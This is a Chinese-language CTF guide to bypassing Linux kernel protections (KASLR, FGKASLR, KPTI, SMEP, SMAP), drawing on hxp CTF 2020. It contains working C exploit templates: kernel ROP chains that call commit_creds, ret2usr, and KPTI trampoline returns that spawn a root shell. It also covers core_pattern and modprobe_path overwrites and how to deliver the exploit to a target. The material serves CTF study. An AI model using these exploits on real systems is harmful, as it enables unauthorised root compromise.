# CTF Pwn - 内核保护绕过

## 目录
- [KASLR 和 FGKASLR 绕过](#kaslr-and-fgkaslr-bypass)
  - [通过栈泄露绕过 KASLR (hxp CTF 2020)](#kaslr-bypass-via-stack-leak-hxp-ctf-2020)
  - [FGKASLR 绕过 (hxp CTF 2020)](#fgkaslr-bypass-hxp-ctf-2020)
- [KPTI 绕过方法](#kpti-bypass-methods)
  - [方法 1：swapgs_restore 跳板](#method-1-swapgs_restore-trampoline)
  - [方法 2：信号处理程序 (SIGSEGV)](#method-2-signal-handler-sigsegv)
  - [方法 3：通过 ROP 修改 modprobe_path](#method-3-modprobe_path-via-rop)
  - [方法 4：通过 ROP 修改 core_pattern](#method-4-core_pattern-via-rop)
- [SMEP / SMAP 绕过](#smep--smap-bypass)
- [KPTI / SMEP / SMAP 快速参考](#kpti--smep--smap-quick-reference)
- [GDB 内核模块调试](#gdb-kernel-module-debugging)
- [无 CONFIG_KALLSYMS_ALL 时查找符号偏移](#finding-symbol-offsets-without-config_kallsyms_all)
- [利用模板](#exploit-templates)
  - [完整内核 ROP 模板 (SMEP + KPTI)](#full-kernel-rop-template-smep--kpti)
  - [ret2usr 模板 (无 SMEP/SMAP)](#ret2usr-template-no-smepsmap)
- [利用载荷投递](#exploit-delivery)

---

## KASLR 和 FGKASLR 绕过

### 通过栈泄露绕过 KASLR (hxp CTF 2020)

从栈中泄露内核文本指针以计算 KASLR（内核地址空间布局随机化）偏移：

```c
// 未启用 KASLR 的内核基址
#define KERNEL_BASE 0xffffffff81000000

unsigned long leak[40];
read(fd, leak, sizeof(leak));  // 从易受攻击的模块进行超长读取

// leak[38] 包含随机化的内核文本指针
unsigned long kaslr_offset = (leak[38] & 0xffffffffffff0000) - KERNEL_BASE;

// 将偏移应用到所有地址
unsigned long commit_creds_kaslr = commit_creds + kaslr_offset;
unsigned long pop_rdi_ret_kaslr = pop_rdi_ret + kaslr_offset;
```

**其他 KASLR 泄露来源：**
- `/proc/kallsyms`（如果 `kptr_restrict != 1`）
- `dmesg`（如果 `dmesg_restrict != 1`）
- 内核 oops 消息（如果 oops 不会导致 panic）
- 读取已释放的内核对象（UAF）中包含的文本指针
- `modprobe_path` 只有 1 字节熵 — 可用 AAW 暴力破解

### FGKASLR 绕过 (hxp CTF 2020)

FGKASLR（函数粒度 KASLR）对单个函数进行随机化，但早期的 `.text` 段（大约偏移到 `0x400dc6`）仍保持相对于内核基址的固定偏移。该范围内的 gadget 可安全使用。

**方法 1：仅使用未随机化的 `.text` gadget**

```bash
# 查找仅在未随机化范围内的 gadget
ropr --no-uniq -R "^pop rdi; ret;|^swapgs" ./vmlinux | \
    awk -F: '{if (strtonum("0x"$1) < 0xffffffff81400dc6) print}'
```

`swapgs_restore_regs_and_return_to_usermode` 位于未随机化的 `.text` 段，可仅使用 KASLR 基址偏移。

**方法 2：通过 `__ksymtab` 解析随机化函数**

`__ksymtab` 条目使用相对偏移而非绝对地址。`__ksymtab` 段本身不受 FG-KASLR 随机化：

```c
// struct kernel_symbol { int value_offset; int name_offset; int namespace_offset; };
// 真实地址 = &ksymtab_entry + entry.value_offset

unsigned long ksymtab_prepare_kernel_cred = 0xffffffff81f8d4fc; // 来自 /proc/kallsyms
unsigned long ksymtab_commit_creds = 0xffffffff81f87d90;

// ROP 链读取 ksymtab 条目并计算真实地址：
// 1. 将 ksymtab 地址加载到 rax
payload[off++] = pop_rax_ret + kaslr_offset;
payload[off++] = ksymtab_prepare_kernel_cred + kaslr_offset;
// 2. 读取 4 字节相对偏移：mov eax, [rax]
payload[off++] = mov_eax_deref_rax_pop1_ret + kaslr_offset;
payload[off++] = 0x0;
// 3. 返回用户态计算：real_addr = ksymtab_addr + kaslr_offset + offset
payload[off++] = kpti_trampoline + kaslr_offset + 22;
payload[off++] = 0; payload[off++] = 0;
payload[off++] = (unsigned long)resolve_and_continue;
// ...

void resolve_and_continue() {
    // eax 包含从 ksymtab 读取的相对偏移
    unsigned long resolved = ksymtab_prepare_kernel_cred + kaslr_offset + fetched_offset;
    // 之后在下一阶段 ROP 中使用解析后的地址
}
```

**关键点：** FG-KASLR 需要多阶段利用：先返回用户态计算 `__ksymtab` 偏移解析的真实地址，再用解析后的函数地址重新进入内核执行第二阶段 ROP 链。

---
## KPTI 绕过方法

KPTI（Kernel Page Table Isolation，内核页表隔离）将内核和用户页表分开。简单的 `swapgs; iretq` 会失败，因为用户页表未被恢复。有四种绕过方法：

### 方法 1：swapgs_restore 跳板

内核函数 `swapgs_restore_regs_and_return_to_usermode` 处理完整的 KPTI 返回序列。跳转到偏移 +22 以跳过寄存器恢复的前序代码，直接落在 CR3 切换 + `swapgs` + `iretq` 序列：

```c
// 来自 /proc/kallsyms 或 vmlinux 的符号
unsigned long kpti_trampoline = 0xffffffff81200f10;

// 在 ROP 链中，commit_creds 之后：
payload[off++] = kpti_trampoline + 22;  // 跳过到 mov rdi,rsp; ... swapgs; iretq
payload[off++] = 0x0;                    // 填充（被跳板弹出）
payload[off++] = 0x0;                    // 填充
payload[off++] = user_rip;
payload[off++] = user_cs;
payload[off++] = user_rflags;
payload[off++] = user_sp;
payload[off++] = user_ss;
```

**关键点：** +22 偏移跳过了函数的寄存器弹出/恢复序列，直接进入 CR3 切换、执行 `swapgs` 和 `iretq` 的位置。此偏移可能因内核版本不同而变化——需通过反汇编函数确认。

### 方法 2：信号处理器（SIGSEGV）

在利用前注册一个 SIGSEGV 处理器。当 `iretq` 返回时未处理 KPTI，导致页错误触发 SIGSEGV，处理器捕获信号并启动 shell：

```c
#include <signal.h>

void spawn_shell() {
    if (getuid() == 0) system("/bin/sh");
}

// 利用前：
struct sigaction sa;
sa.sa_handler = spawn_shell;
sigemptyset(&sa.sa_mask);
sa.sa_flags = 0;
sigaction(SIGSEGV, &sa, NULL);
```

ROP 链仍调用 `commit_creds(prepare_kernel_cred(0))` 并执行 `swapgs; iretq` 返回用户态。尽管返回因页表错误而失败，凭证已提交。SIGSEGV 处理器以 root 权限运行。

### 方法 3：通过 ROP 修改 modprobe_path

不返回用户态，直接用内核 ROP 链通过 `pop rax; pop rdi; mov [rdi], rax; ret` gadget 覆盖 `modprobe_path`。无需 KPTI 处理——写操作完全在内核上下文中完成。

完整技术、触发序列和 ROP payload 见 [kernel.md - modprobe_path Overwrite](kernel.md#modprobe_path-覆盖)。

### 方法 4：通过 ROP 修改 core_pattern

类似方法 3，但覆盖 `core_pattern` 为管道命令（如 `"|/evil"`）。当任意进程崩溃时，内核以 root 权限执行管道程序。

完整技术及如何查找 `core_pattern` 地址见 [kernel.md - core_pattern Overwrite](kernel.md#core_pattern-覆盖)。

---

## SMEP / SMAP 绕过

**SMEP（Supervisor Mode Execution Prevention，监督模式执行防护）：** 阻止内核模式执行用户态页面。
- **绕过：** 使用内核 ROP（kROP）链——所有 gadget 来自内核 `.text`。详见 [kernel.md - Kernel ROP](kernel.md#使用-prepare_kernel_cred--commit_creds-的内核-rop)。

**SMAP（Supervisor Mode Access Prevention，监督模式访问防护）：** 阻止内核模式访问用户态内存。
- **绕过：** 使用堆驻留链的 kROP，或使用 `stac`/`clac` gadget 临时禁用 SMAP。

**直接修改 CR4（旧内核）：** 写 CR4 清除 SMEP/SMAP 位。现代内核通过 `native_write_cr4()` 固定阻止此操作。

---

## KPTI / SMEP / SMAP 快速参考

| 保护机制 | 阻止内容 | 绕过方法 |
|-----------|--------|--------|
| SMEP | 内核执行用户态页面 | kROP（内核 ROP 链）——见 [kernel.md](kernel.md#使用-prepare_kernel_cred--commit_creds-的内核-rop) |
| SMAP | 内核访问用户态内存 | 堆驻留链的 kROP，`stac`/`clac` gadget |
| 无 SMEP/SMAP | （无阻止） | [ret2usr](kernel.md#ret2usr无-smepsmap) —— 直接调用用户态提权函数 |
| KPTI | 内核页表隔离 | [跳板](#method-1-swapgs_restore-trampoline)、[信号处理器](#method-2-signal-handler-sigsegv)、[modprobe_path](#method-3-modprobe_path-via-rop)、[core_pattern](#method-4-core_pattern-via-rop) |

详见 [KPTI 绕过方法](#kpti-bypass-methods) 获取带代码的详细绕过技术。

---
## GDB 内核模块调试

在 GDB 中加载易受攻击的内核模块符号，以进行源码级调试：

```bash
# 1. 查找模块加载地址（在 QEMU 内以 root 身份）
cat /proc/modules
# vuln 16384 0 - Live 0xffffffffc0000000 (O)

# 2. 在 GDB 中，在该地址加载模块符号
(gdb) target remote localhost:1234
(gdb) add-symbol-file vuln.ko 0xffffffffc0000000
(gdb) b swrite            # 在模块函数处设置断点
(gdb) c

# 3. 断点命中后检查栈
(gdb) x/20xg $rsp-0x90    # 查看栈缓冲区
(gdb) search "AAAAAAAA"   # 查找缓冲区位置（pwndbg）
```

**注意：** `/proc/modules` 需要 root 权限才能读取实际地址。非 root 用户看到的地址均为零。修改 `/init` 以保持 root 权限进行调试。

---

## Initramfs 和 virtio-9p 工作流程

**通过 virtio-9p 共享目录** — 在主机和 QEMU 之间传输利用代码，无需重建 initramfs：
```bash
# 添加到 QEMU 启动脚本：
-fsdev local,security_model=passthrough,id=fsdev0,path=./share \
-device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare

# 在 QEMU 客户机内（添加到 /init 或手动执行）：
mkdir -p /home/ctf && mount -t 9p -o trans=virtio,version=9p2000.L hostshare /home/ctf

# 在主机上，将利用程序编译到共享目录：
gcc exploit.c -static -o ./share/exploit
```

**提取并修改 initramfs：**
```bash
# 提取
mkdir initramfs && cd initramfs
gzip -dc ../initramfs.cpio.gz | cpio -idmv

# 修改 /init 以便调试（获取 root shell 而非非特权用户）
# 注释掉：exec su -l ctf
# 添加：/bin/sh

# 重新打包
find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../initramfs.cpio.gz
```

**调试时对 `/init` 的关键修改：**
- 注释掉 `exec su -l ctf`（或类似命令）以保持 root 权限
- 注释掉 `echo 1 > /proc/sys/kernel/kptr_restrict` 以查看 `/proc/kallsyms`
- 注释掉 `echo 1 > /proc/sys/kernel/dmesg_restrict` 以查看 dmesg
- 注释掉 `chmod 400 /proc/kallsyms` 以读取符号地址

---

## 在无 CONFIG_KALLSYMS_ALL 的情况下查找符号偏移

默认情况下，`/proc/kallsyms` 只显示 `.text` 段符号。数据符号如 `modprobe_path` 和 `core_pattern` 需要启用 `CONFIG_KALLSYMS_ALL=y`。

**查找 modprobe_path：**

```bash
# 1. 获取 call_usermodehelper_setup 地址（总是在 /proc/kallsyms 中）
cat /proc/kallsyms | grep call_usermodehelper_setup

# 2. 在 GDB 中设置断点并触发
hb *0xffffffff810c8c80
# 触发：echo -ne '\xff\xff\xff\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x

# 3. 检查第一个参数（RDI = modprobe_path）
(gdb) p/x $rdi
# 0xffffffff8265ff00
(gdb) x/s $rdi
# "/sbin/modprobe"
```

**查找 core_pattern：**

```bash
# 1. 在 override_creds（由 do_coredump 调用）处设置断点
# 2. 使进程崩溃：gcc -static -o crash -xc - <<< 'int main(){((void(*)())0)();}'
# 3. override_creds 返回后反汇编 — 查找 movzx 指令中的数据地址
```

---

## 利用模板

### 完整内核 ROP 模板（SMEP + KPTI）

针对启用 SMEP 和 KPTI 的内核栈溢出完整利用示例：

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

// 来自 vmlinux 的地址（如有需要，应用 KASLR 偏移）
unsigned long prepare_kernel_cred;
unsigned long commit_creds;
unsigned long pop_rdi_ret;
unsigned long mov_rdi_rax_pop1_ret;
unsigned long kpti_trampoline;

// 用户态寄存器状态
unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;

void save_userland_state() {
    __asm__(".intel_syntax noprefix;"
        "mov %[cs], cs;"
        "mov %[ss], ss;"
        "mov %[sp], rsp;"
        "pushf; pop %[rflags];"
        ".att_syntax;"
        : [cs] "=r"(user_cs), [ss] "=r"(user_ss),
          [sp] "=r"(user_sp), [rflags] "=r"(user_rflags));
    user_rip = (unsigned long)spawn_shell;
}

void spawn_shell() {
    if (getuid() == 0) {
        printf("[+] root!\n");
        system("/bin/sh");
    } else {
        printf("[-] privesc failed\n");
        exit(1);
    }
}

int main() {
    save_userland_state();
    int fd = open("/dev/hackme", O_RDWR);

    // 第一步：泄露 canary 和 KASLR 基址
    unsigned long leak[40];
    read(fd, leak, sizeof(leak));
    unsigned long cookie = leak[16];
    unsigned long kaslr_offset = (leak[38] & 0xffffffffffff0000) - 0xffffffff81000000;

    // 第二步：应用 KASLR 偏移
    prepare_kernel_cred += kaslr_offset;
    commit_creds += kaslr_offset;
    pop_rdi_ret += kaslr_offset;
    mov_rdi_rax_pop1_ret += kaslr_offset;
    kpti_trampoline += kaslr_offset;

    // 第三步：构造 ROP 链
    unsigned long payload[50];
    int off = 16;
    payload[off++] = cookie;
    payload[off++] = 0;  // rbx
    payload[off++] = 0;  // r12
    payload[off++] = 0;  // rbp

    // prepare_kernel_cred(0) → commit_creds(result)
    payload[off++] = pop_rdi_ret;
    payload[off++] = 0;
    payload[off++] = prepare_kernel_cred;
    payload[off++] = mov_rdi_rax_pop1_ret;
    payload[off++] = 0;  // pop rbx 填充
    payload[off++] = commit_creds;

    // KPTI 安全返回用户态
    payload[off++] = kpti_trampoline + 22;
    payload[off++] = 0;  // 填充
    payload[off++] = 0;  // 填充
    payload[off++] = user_rip;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    write(fd, payload, sizeof(payload));
    return 0;
}
```
### ret2usr 模板（无 SMEP/SMAP）

```c
void privesc() {
    __asm__(".intel_syntax noprefix;"
        "movabs rax, %[prepare_kernel_cred];"
        "xor rdi, rdi;"
        "call rax;"
        "mov rdi, rax;"
        "movabs rax, %[commit_creds];"
        "call rax;"
        "swapgs;"
        "mov r15, %[user_ss];   push r15;"
        "mov r15, %[user_sp];   push r15;"
        "mov r15, %[user_rflags]; push r15;"
        "mov r15, %[user_cs];   push r15;"
        "mov r15, %[user_rip];  push r15;"
        "iretq;"
        ".att_syntax;"
        : : [prepare_kernel_cred] "r"(prepare_kernel_cred),
            [commit_creds] "r"(commit_creds),
            [user_ss] "r"(user_ss), [user_sp] "r"(user_sp),
            [user_rflags] "r"(user_rflags),
            [user_cs] "r"(user_cs), [user_rip] "r"(user_rip));
}
```

---

## 漏洞利用载荷传输

内核漏洞利用通常是大型静态二进制文件。远程传输时应尽量减小体积：

```bash
# 1. 使用 musl-libc 编译（比 glibc 小得多）
musl-gcc -static -O2 -o exploit exploit.c

# 2. 去除符号表
strip exploit

# 3. 压缩并编码以便传输
gzip exploit && base64 exploit.gz > exploit.b64

# 4. 目标机上：解码并解压
base64 -d exploit.b64 | gunzip > /tmp/exploit && chmod +x /tmp/exploit

# 可选：使用 UPX 压缩（进一步减小体积）
upx --best exploit
```

**常见陷阱：** 如果利用程序使用 `setxattr()` 并带有文件路径，确保该文件在远程环境中存在。因为本地路径（如 `/tmp/exploit`）可能与远程路径（如 `/home/user/exploit`）不同。
